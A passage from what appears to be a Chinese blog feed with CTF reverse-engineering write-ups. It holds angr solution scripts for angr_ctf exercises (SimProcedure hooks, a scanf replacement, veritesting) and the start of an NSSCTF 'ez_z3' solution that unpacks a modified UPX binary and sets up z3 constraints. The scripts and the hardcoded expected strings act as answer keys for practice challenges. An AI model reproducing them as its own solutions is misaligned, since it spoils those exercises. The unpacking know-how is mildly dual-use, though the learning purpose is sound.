class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Try'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">'./10_angr_simprocedures'</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>p <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>init_state <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">Hook</span><span class=\"token punctuation\">(</span>angr<span class=\"token punctuation\">.</span>SimProcedure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> addr<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\"># 后两个参数即为 check_equals 函数的参数</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        input_buffer <span class=\"token operator\">=</span> addr</pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        input_size <span class=\"token operator\">=</span> size</pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        <span class=\"token comment\"># 从内存中读取输入</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        input_str <span class=\"token operator\">=</span> self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span>input_buffer<span class=\"token punctuation\">,</span> input_size<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        right_str <span class=\"token operator\">=</span> <span class=\"token string\">'OSIWHBXIFOQVSBZB'</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token comment\"># 比较返回符号约束</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>        result <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>If<span class=\"token punctuation\">(</span>input_str <span class=\"token operator\">==</span> right_str<span class=\"token punctuation\">,</span> claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                            claripy<span class=\"token punctuation\">.</span>BVV<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">return</span> result</pre></td></tr><tr><td data-num=\"39\"></td><td><pre><span class=\"token comment\"># funcname 一定要相同，可在 IDA 中查看</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>hooked_funcname <span class=\"token operator\">=</span> <span class=\"token string\">'check_equals_OSIWHBXIFOQVSBZB'</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>p<span class=\"token punctuation\">.</span>hook_symbol<span class=\"token punctuation\">(</span>hooked_funcname<span class=\"token punctuation\">,</span> Hook<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>simgr <span class=\"token operator\">=</span> p<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>init_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>simgr<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre></pre></td></tr><tr><td data-num=\"46\"></td><td><pre><span class=\"token keyword\">if</span> simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simgr<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    flag <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"11_angr_sim_scanf\"><a class=\"markdownIt-Anchor\" href=\"#11_angr_sim_scanf\">#</a> 11_angr_sim_scanf</h3>\n<p>如题，这题主要是学习如何 hook <code>scanf</code>  函数，步骤其实与上一题是几乎一致的，得先找到需要 hook 的函数符号，然后编写一个继承 angr.SimProcedure 的类，然后利用 <code>hook_symbol</code>  对函数进行 hook</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">good</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Good'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">bad</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    tag <span class=\"token operator\">=</span> <span class=\"token string\">b'Try'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token keyword\">return</span> <span class=\"token boolean\">True</span> <span class=\"token keyword\">if</span> tag <span class=\"token keyword\">else</span> <span class=\"token boolean\">False</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>path_to_binary <span class=\"token operator\">=</span> <span class=\"token string\">'./11_angr_sim_scanf'</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>project <span class=\"token operator\">=</span> angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span>path_to_binary<span class=\"token punctuation\">,</span> auto_load_libs<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>initial_state <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">ReplacementScanf</span><span class=\"token punctuation\">(</span>angr<span class=\"token punctuation\">.</span>SimProcedure<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token comment\"># 第一个参数是 scanf 的格式化字符串，接着是两个 buffer 地址</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">run</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> format_string<span class=\"token punctuation\">,</span> scanf0_address<span class=\"token punctuation\">,</span> scanf1_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        <span class=\"token comment\"># 在 run 中完成 scanf 的功能，即向目标地址写入符号</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        <span class=\"token comment\"># 定义两个符号变量，用于写入 buffer</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        scanf0 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'scanf0'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        scanf1 <span class=\"token operator\">=</span> claripy<span class=\"token punctuation\">.</span>BVS<span class=\"token punctuation\">(</span><span class=\"token string\">'scanf1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\"># 写入内存，最后一个参数指定字节序</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>scanf0_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>                                scanf0<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                                endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span>memory<span class=\"token punctuation\">.</span>store<span class=\"token punctuation\">(</span>scanf1_address<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                                scanf1<span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>                                endness<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>arch<span class=\"token punctuation\">.</span>memory_endness<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># 保存变量到全局，方便后续约束求解</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution0'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> scanf0</pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        self<span class=\"token punctuation\">.</span>state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution1'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> scanf1</pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\"># scanf 的函数名称，可在 ida 中查看</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>scanf_symbol <span class=\"token operator\">=</span> <span class=\"token string\">'__isoc99_scanf'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>project<span class=\"token punctuation\">.</span>hook_symbol<span class=\"token punctuation\">(</span>scanf_symbol<span class=\"token punctuation\">,</span> ReplacementScanf<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>simulation <span class=\"token operator\">=</span> project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>simulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>good<span class=\"token punctuation\">,</span> avoid<span class=\"token operator\">=</span>bad<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    solution_state <span class=\"token operator\">=</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    <span class=\"token comment\"># 对符号变量进行约束求解</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    stored_solutions0 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution0'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    stored_solutions1 <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span><span class=\"token builtin\">globals</span><span class=\"token punctuation\">[</span><span class=\"token string\">'solution1'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    scanf0_solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>stored_solutions0<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>    scanf1_solution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>solver<span class=\"token punctuation\">.</span><span class=\"token builtin\">eval</span><span class=\"token punctuation\">(</span>stored_solutions1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>scanf0_solution<span class=\"token punctuation\">,</span> scanf1_solution<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    <span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>run 方法用于执行 ReplacementScanf 类的实例。该方法接收三个参数，分别为 format_string、param0 和 param1。</p>\n<h3 id=\"12_angr_veritesting\"><a class=\"markdownIt-Anchor\" href=\"#12_angr_veritesting\">#</a> 12_angr_veritesting</h3>\n<p>此题与之前的题目不同的地方在于，它不仅是按位进行比较的，而且是按位进行混淆后马上比较。之前的题目都是整体混淆后比较。因此路径爆炸同时出现在混淆和比较两个地方。</p>\n<p>考虑使用路径归并的搜索策略 veritesting 解题 (体验一下 veritesting)</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> angr</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> claripy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> sys</pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">test</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token builtin\">file</span><span class=\"token operator\">=</span><span class=\"token string\">'12_angr_veritesting'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>\tproject<span class=\"token operator\">=</span>angr<span class=\"token punctuation\">.</span>Project<span class=\"token punctuation\">(</span><span class=\"token builtin\">file</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>\tinitial_state<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>entry_state<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>\t</pre></td></tr><tr><td data-num=\"10\"></td><td><pre>\t<span class=\"token comment\">#Veritesting 结合了静态符合执行与动态符号执行，减少了路径爆炸的影响</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>\tsimulation<span class=\"token operator\">=</span>project<span class=\"token punctuation\">.</span>factory<span class=\"token punctuation\">.</span>simgr<span class=\"token punctuation\">(</span>initial_state<span class=\"token punctuation\">,</span>veritesting<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">succ</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">b'Good Job.'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>\t<span class=\"token keyword\">def</span> <span class=\"token function\">fail</span><span class=\"token punctuation\">(</span>state<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>\t\t<span class=\"token keyword\">return</span> <span class=\"token string\">b'Try again.'</span> <span class=\"token keyword\">in</span> state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>\tsimulation<span class=\"token punctuation\">.</span>explore<span class=\"token punctuation\">(</span>find<span class=\"token operator\">=</span>succ<span class=\"token punctuation\">,</span>avoid<span class=\"token operator\">=</span>fail<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>\t<span class=\"token keyword\">if</span> simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>\t\tsolution_state<span class=\"token operator\">=</span>simulation<span class=\"token punctuation\">.</span>found<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>\t\tsolution <span class=\"token operator\">=</span> solution_state<span class=\"token punctuation\">.</span>posix<span class=\"token punctuation\">.</span>dumps<span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>stdin<span class=\"token punctuation\">.</span>fileno<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t\t<span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Solution is &#123;0&#125;'</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span>solution<span class=\"token punctuation\">.</span>decode<span class=\"token punctuation\">(</span><span class=\"token string\">'utf-8'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>\t<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>\t\t<span class=\"token keyword\">raise</span> Exception<span class=\"token punctuation\">(</span><span class=\"token string\">'Could not find the solution'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre><span class=\"token keyword\">if</span> __name__<span class=\"token operator\">==</span><span class=\"token string\">\"__main__\"</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>\ttest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><link rel=\"stylesheet\" href=\"/css/spoiler.css\" type=\"text/css\"><script src=\"/js/spoiler.js\" type=\"text/javascript\" async></script>",
            "tags": [
                "笔记"
            ]
        },
        {
            "id": "https://3cly.github.io/2023/04/02/%E5%87%A0%E9%81%93RE%E9%A2%98/",
            "url": "https://3cly.github.io/2023/04/02/%E5%87%A0%E9%81%93RE%E9%A2%98/",
            "title": "几道RE题",
            "date_published": "2023-04-02T11:06:48.000Z",
            "content_html": "<h1 id=\"some_re题目\"><a class=\"markdownIt-Anchor\" href=\"#some_re题目\">#</a> some_RE 题目</h1>\n<h2 id=\"ez_z3\"><a class=\"markdownIt-Anchor\" href=\"#ez_z3\">#</a> ez_z3</h2>\n<p>一道来自 NSSCTF 举办的逆向专题比赛 round#x 的题目</p>\n<p>(NSSCTF 和 NKCTF 时间重复了 两边都在看题 = =)</p>\n<p><img data-src=\"/images/image-20230331170435294.png\" alt=\"image-20230331170435294\"></p>\n<p>在 IDA 中看很明显看到加了壳 直接脱 UPX 不行 魔改了 010 中查看发现就是改了字节头的加壳 直接在 010 中搜索 XYU1 改成 UPX! 就行了</p>\n<p><img data-src=\"/images/image-20230331171858307.png\" alt=\"image-20230331171858307\"></p>\n<p>成功脱壳后在 IDA 中看到主程序 2 次输入 其中在第二个输入后越过循环看到一个需要 z3 解的函数</p>\n<p><img data-src=\"/images/image-20230331173707760.png\" alt=\"image-20230331173707760\"></p>\n<p>直接解就行了</p>\n<p>上脚本</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> z3 <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>a1 <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>BitVec<span class=\"token punctuation\">(</span><span class=\"token string\">'x%d'</span> <span class=\"token operator\">%</span> i<span class=\"token punctuation\">,</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>s <span class=\"token operator\">=</span> Solver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">127</span><span class=\"token punctuation\">)</span>  <span class=\"token comment\"># 添加约束条件①因为输入的肯定是可见字符</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span>a1<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> <span class=\"token operator\">>=</span> <span class=\"token number\">32</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>s<span class=\"token punctuation\">.</span>add<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token number\">20</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">19</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">19</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">18</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">14</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">13</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">13</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">12</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">11</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">10</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">*</span> <span class=\"token number\">10</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">9</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">30</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">5</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>    <span class=\"token operator\">+</span> <span class=\"token number\">5</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">4</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token operator\">+</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token operator\">+</span> <span class=\"token number\">2</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">3</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token operator\">-</span> <span class=\"token number\">4</span> <span class=\"token operator\">*</span> a1<span class=\"token punctuation\">[</span><span class=\"token number\">3</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td 